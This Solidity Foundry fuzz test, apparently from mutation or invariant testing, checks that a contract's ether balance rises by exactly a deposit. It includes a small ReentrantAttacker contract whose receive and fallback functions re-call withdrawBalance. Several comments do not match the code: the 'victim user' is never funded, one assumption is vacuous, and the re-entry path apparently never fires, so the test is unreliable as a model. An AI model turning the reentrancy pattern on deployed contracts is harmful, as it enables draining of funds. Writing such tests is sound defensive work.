pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(); }
    function testFuzz_property(uint256 amount, uint256 attackAmount) public {
        // Admissible domain: amounts that don't overflow uint256 when added to zero
        vm.assume(amount <= type(uint).max);
        vm.assume(attackAmount <= amount && attackAmount > 0);
        // Deploy a re-entrant attacker that will trigger the bug
        ReentrantAttacker attacker = new ReentrantAttacker(c, attackAmount);
        address attackerAddr = address(attacker);
        // Fund the attacker and the victim user
        vm.deal(attackerAddr, amount);
        // Record balance before the call
        uint256 balBefore = address(c).balance;
        // Attacker makes a single addToBalance call
        vm.prank(attackerAddr);
        c.addToBalance{value: amount}();
        // Record balance after the call
        uint256 balAfter = address(c).balance;
        // Rule: the contract's ether balance increased by exactly the amount sent
        assertTrue(balAfter == balBefore + amount);
    }
}

contract ReentrantAttacker {
    C target;
    uint256 attackAmt;
    constructor(C _target, uint256 _attackAmt) payable {
        target = _target;
        attackAmt = _attackAmt;
    }
    receive() external payable {
        // Re-enter only once, withdrawing a portion to break the invariant
        if (address(target).balance >= attackAmt && target.getBalance(address(this)) == attackAmt) {
            target.withdrawBalance();
        }
    }
    fallback() external payable {
        if (address(target).balance >= attackAmt && target.getBalance(address(this)) == attackAmt) {
            target.withdrawBalance();
        }
    }
}

